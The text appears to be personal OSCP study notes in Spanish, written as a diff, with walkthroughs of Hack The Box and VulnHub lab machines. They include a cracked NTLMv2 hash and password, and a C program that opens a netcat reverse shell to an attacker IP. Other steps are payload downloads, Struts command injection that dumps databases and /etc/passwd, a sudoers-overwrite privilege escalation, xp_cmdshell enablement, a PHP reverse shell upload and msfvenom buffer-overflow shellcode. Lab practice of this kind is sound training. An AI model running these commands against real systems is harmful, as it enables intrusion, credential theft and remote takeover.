+Ahora el responder.py me va dar el resultado:
++] Listening for events...
+[SMB] NTLMv2-SSP Client   : 10.10.10.104
+[SMB] NTLMv2-SSP Username : GIDDY\Stacy
+[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:0079eca5fb2673d8:758F5DB42309DA5632B6B602CF354EE1:0101000000000000C0653150DE09D201246FDA554CC0C026000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000001C271670741CA9C494CF1B2267575AF32B91A818248E5154177451B71E9B2F680A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003700000000000000000000000000
+[*] Skipping previously captured hash for GIDDY\Stacy
+
+Ahora cojo el hash lo pongo en un fichero y lo saco con hashcat:
+hashcat -m 5600 -a 0 --force giddy.hash /usr/share/wordlists/rockyou.txt
+
+STACY::GIDDY:0079eca5fb2673d8:758f5db42309da5632b6b602cf354ee1:0101000000000000c0653150de09d201246fda554cc0c026000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d201060004000200000008003000300000000000000000000000003000001c271670741ca9c494cf1b2267575af32b91a818248e5154177451b71e9b2f680a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003700000000000000000000000000:xNnWo6272k7x
+
+Toca ponerlo en recurso que encontramos /remote:
+Powershell web access
+We can now log in to the web powershell interface using:
+
+Username: giddy\stacy
+Password: xNnWo6272k7x
+Computer: giddy
+
+ESCALA PRIV
+unifivideo local privilege escalation
+Vemos que tiene el programa unifvideo instalado y tiene vulns publicadas en exploitdb.
+Vamos a C:\ProgramData\unifi-video\   creamos el siguiente script en C:
+
+#include <stdlib.h>
+
+int main()
+{
+	system("nc.exe -e cmd.exe 10.10.14.29 9999");
+	return 0;
+}
+
+
+Ahora lo compilamos:
+i686-w64-mingw32-gcc -o giddy.exe giddy.c
+
+Subo el nc.exe y el giddy.exe:
+Invoke-WebRequest -o taskkill.exe http://10.10.14.27/giddy.exe
+Invoke-WebRequest -o nc.exe http://10.10.14.27/nc.exe
+
+Por ultimo dejo a la escucha nc -lvnp 9999  y lanzo en el powershell stop-service -name "Ubiquiti Unifi Video"  y ya somos root.
+
+
+
+
+#xxd Crea un volcado hexadecimal de un archivo
+cat index.php | xxd -r -p
+
+
+#Stratosphere
+POrque encontré en un .py en el que importaban un hashlib, entonces creo un archivo haslib.py con el siguiente comando para elevar privilegios por una vulnerabilidad de python.
+echo 'import os;os.system("/bin/bash")' > hashlib.py
+
+#struts-pwn.py
+python struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c id
+python struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'cat /var/lib/tomcat8/db_connect'
+python struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'ps -ef'
+python struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'mysqldump -u admin --password=admin --no-data users'
+python struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'mysqldump -u admin --password=admin --single-transaction --all-databases'
+python struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'cat /etc/passwd'
+
+
+#Privilege Escalation to monitor
+cd /home/nobody/.ssh
+ssh -i .monitor monitor@10.10.10.87
+ls
+app-dev bin
+ls bin
+ls most red rnano
+red
+!'/bin/sh'
+cd /bin
+./bash
+cd /sbin
+ls
+getcap
+./getcap -h
+./getcap -r -v /usr/bin/
+cd /usr/bin/
+./tac -help
+./tac /root/root.txt
+flag :)
+
+
+#Comandos pop3:
+USER mailadmin
+PASS password
+LIST
++OK 2 1945
+1 1109
+2 836
+RETR 2
+mensaje blah, blah.
+https://medium.com/@ranakhalil101/hack-the-box-solidstate-writeup-w-o-metasploit-c43063c9ca8e
+https://docs.microsoft.com/en-us/exchange/mail-flow/test-smtp-with-telnet?view=exchserver-2019
+https://es.ccm.net/contents/279-protocolos-de-mensajeria-smtp-pop3-e-imap4
+
+#Conexion netcat
+nc 10.10.10.51 4555
+login root
+pass root
+HELP: comandos disponibles.
+
+# SMB Wirehark:
+Windows SMB is more complex than just a version, but looking in wireshark will give a bunch of information about the connection. We can filter on ntlmssp.ntlmv2_response to see NTLMv2 traffic, for example.
+
+# Pivoting
+sshuttle -r user@10.10.10.10 10.1.1.0/24
+
+# Decrypting VNC Password
+wine vncpwdump.exe -k key
+
+# EJEUTAR SCRIPT BASH:
+sudo -u scriptmanager /bin/bash
+
+# PENTESTMONKEY
+Ahora me descargo el SimpleHTTPServer.py: sudo python SimpleHTTPServer.py 80   MUY IMPORTANTE la shell de a continuación tiene que estar en el mismo directorio que el simplehttpserver.
+Me descargo la shell: http://pentestmonkey.net/tools/php-reverse-shell  y cambio esto en el fichero $ip = '10.10.14.12';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS   mi IP local de hackthebox y el puerto por ejemplo 4444.
+A continuación wget 10.10.14.12/shell3.php en la consola del fichero http://10.10.10.68/dev/phpbash.min.php
+y dejo a la escucha:  nc -lnvp 4444
+Ya se subio la shell3. Ahora al entrar en http://10.10.10.68/uploads/shell3.php nos devolvera la shell que teniamos a la escucha.
+
+# SSH Connections:
+ssh user@10.10.10.91 -i clave.key
+ojo! cuidado con las claves que esten bien copiadas y alienadas, sin espacios ni nada o da error. Y darle sus permisos chmod 600
+
+# A través de un código en base64 que encontré puedo sacar una imagen de otra:
+cat encoded.txt | base64 --decode > out.png
+
+# DECODE IMAGE QR:
+https://zxing.org/w/decode.jspx
+
+# BOF brainpan:
+Paso 1: Lanzar EIP.py, a ver si podemos bloquear la aplicación. El script EIP.py se conectará al servicio y enviará 1000 "A" al servicio:, el EIP se ha sobrescrito con 41414141, es decir, "AAAA" en Immunity Debugger.
+Paso 2: El siguiente paso sería determinar después de cuántos bytes se sobrescribe el EIP. Usaremos pattern_create y patter_offset: /usr/share/metasploit-framework/tools/exploit/: 
+./pattern_create.rb -l 1000
+Paso 3: Lanzar pattern.py al ejecutarlo vemos que el EIP se sobrescribe con 35724134.
+Paso 4: ./pattern_offset.rb -q 35724134 al lanzarlo me da 524, vamos a actualizar el exploit.
+Paso 5: Ejecutar el script EIP-overwritten.py y se sobrescribe el EIP con 424242...
+Paso 6: Ahora necesitamos sobrescribor la EIP con dirección JMP ESP. Vamos a Executable Modules y selecciono and brainpan.exe, haglo click en el, seguidamente search for command, dentro de command poner a buscar JMP ESP y aparecera la dirección 311712F3.
+Paso 7: Cambiar la EIP con JMP ESP code, la dirección JMP ESP es 311712F3, la dirección EIP se organiza hacia atrás a medida que se envía a la pila, es decir \xf3\x12\x17\x31
+Paso 8: Hacemos y lanzamos el exploit JMP-ESP.py Envía la carga útil. Puedes notar que el ESP se sobrescribe con 10 D's. Por lo tanto, las primeras 10 C utilizadas deben establecerse en \ x90, es decir, sin valor de operación.
+Paso 9: El siguiente paso es crear la reverse TCP Shellcode: msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.10 LPORT=1234 R -e x86/alpha_upper -b "\x00" -f c       y pegar la shellcode en el último exploit bof-final.py
+Ejecutar bof-final.py    nc -nvlp 1234
+elevation priv: Poner esto en el terminal:  sudo /home/anansi/bin/anansi_util manual /bin/bash      Aparecerá esto:  (press RETURN)    Y tenemos que poner esto: !/bin/bash  Y somos root.
+
+# EXPERIENCIAS MÁQUINAS
+- DESCARGAR ARCHIVOS EN FTP:
+get
+
+- cpassword = gpp-decrypt:
+Cuando encuentre en un fichero un "cpassword" hay que descifrar con gpp-decrypt
+
+- GIT: Hay que buscar donde este instalado.
+git log
+para ver todos los git que hizo.
+git log -p -8
+para ver un git concreto con el -p -8
+
+- VER ARCHIVOS OCULTOS WINDOWS:
+dir /r
+
+
+- AÑADIR DNS A IP:
+nano  /etc/hosts
+ip	dominio
+
+- PARA ELEVAR PRIVILEGIOS, SE BUSCA EN ESTE DIRECTORIO, POR EJEMPLO, TOOLS VULNERABLES COMO chkrootkit, es una herramienta que busca rootkits en el sistema Y ESA VERSIÓN ES VULNERABLE Y EXISTE EXPLOITS PÚBLICOS: Chkrootkit 0.49 - Local Privilege Escalation                                                                 | exploits/linux/local/33899.txt
+ls -al /etc/cron*
+echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+chmod 777 /tmp/update
+python -c 'import pty;pty.spawn("/bin/bash")'
+sudo su
+Ya soy root!
+ANTERIORMENTE HEMOS CREADO EL ARCHIVO UPDATE AÑADIENDO AL USUARIO www-data COMO ROOT.
+
+- sqsh -S ip -U sa  (sa es el identificador de la password)
+Sqsh, abreviatura de SQSHell, es un sustituto de código abierto para isql, el cliente SQL interactivo suministrado con el sistema de gestión de bases de datos relacionales Adaptive Server Enterprise de Sybase.             
+EXEC sp_configure 'show advanced options', 1
+go
+RECONFIGURE
+go
+EXEC sp_configure 'xp_cmdshell', 1
+go
+RECONFIGURE
+go
+xp_cmdshell 'dir C:\Users\Sarah\Desktop'
+go
+xp_cmdshell 'type C:\Users\Sarah\Desktop\user.txt'
+go
+
+- TENÍA EL PUERTO 3128 abierto con http-proxy Squid. ASÍ QUE CREO UN TUNEL SSH CON PROXY TUNEL PORQUE TENÍA EL PUERTO 22 CERRADO. CON ESE GESTO PUEDO ACCEDER AL PUERTO "22".
+proxytunnel -p 10.0.2.19:3128 -d 127.0.0.1:22 -a 1234
+  -p LA IP Y PUERTO DE ORIGEN (donde esta el proxy). -d MI LOCAL HOST VENGA EL PUERTO 22. -a ME LO HABRA EN EL PUERTO 1234.
+ssh john@127.0.0.1 -p 1234 /bin/bash
+john@127.0.0.1's password: 
+id
+uid=1000(john) gid=1000(john) groups=1000(john)
+
+#Cyber Chef
+https://gchq.github.io/CyberChef/
+
+#NOTA: 
+- rdesktop para conectar RDP: https://alexariza.net/tutorial/acceso-remote-desktop-desde-linux/
+- Terminar de instalar en casa: https://github.com/Hackplayers/Empire-mod-Hackplayers  al ejecutar ./empire da errores volver a instalar-arreglar.
+- Instalar tmux en casa, da errores.
+
+# BOF Formación: https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G   y hacer este: https://github.com/stephenbradshaw/vulnserver  y este: https://github.com/r4j0x00/oscp-like-stack-buffer-overflow  y  https://github.com/justinsteven/dostackbufferoverflowgood
+- Hacer BoF de la guia OSCP.
+- https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e  BoF
+- Hacer la machine goldeneye.
+- Hacer machine nullbyte1.
+- Hacer https://www.vulnhub.com/entry/lord-of-the-root-101,129/
+- Hacer https://www.secjuice.com/writeup-lazysysadmin-vulnhub/
+- Hacer machines de https://g0blin.co.uk/
+- https://blog.barradell-johns.com/index.php/2018/07/10/pinkys-palace-v1-writeup/
+- Own crafted Windows XP machine with SLMail, Minishare, DoStackOverflowGood, VulnServer and WarFTPD: 
+	* Minishare 1.4.1: https://www.exploit-db.com/exploits/636
+	* Savant Web Server 3.1: https://www.exploit-db.com/exploits/10434
+	* Freefloat FTP Server 1.0: https://www.exploit-db.com/exploits/40673
+	* Core FTP Server 1.2: https://www.exploit-db.com/exploits/39480
+	* WarFTPD 1.6.5: https://www.exploit-db.com/exploits/3570/ 
+	* SLMail: https://www.exploit-db.com/exploits/638/   https://www.exploit-db.com/exploits/646/
+- https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/
+- SOKAR VULNHUB
+- TROLLCAVE VULNHUB
+- https://exploit-exercises.com/nebula/
+- XERES VULNHUB
+- Temple of Doom  Vulnhub
+- Bulldog  Vulnhub
+
+#Planing exam
+Comenzar a realizar el BOF=25pts, mientras realizo el BOF he lanzado previamente nmap y enumerando:
+nmap ip.ip.ip.ip -A -p- --min-rate=5000 --max-retries=5 -o tcp.txt y si hay puertos webs abiertos utilizar dirsearch u otros para enumerar sitios ocultos.
+
+# https://gtfobins.github.io/
+# https://lolbas-project.github.io/
+
+# MV WINDOWS: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
+
+# BOF PRACTICE:
+https://github.com/justinsteven/dostackbufferoverflowgood
+https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/
+https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+https://www.tenouk.com/Bufferoverflowc/Bufferoverflow1.html
+https://raw.githubusercontent.com/m0nad/Papers/master/buffer_overflow_iniciantes.txt
+
+# BOF (WIP)
+(Bad Characters: 0x00, 0x0A)
+Fuzzing
+Finding eip position
+Finding bad chars
+Locating jmp esp
+Generating payload with msfvenom
+Getting reverse shell with netcat
+
+# Bacons cipher encoder/decoder:
+https://mothereff.in/bacon
+
+# Music OSCP: br3aking c0de
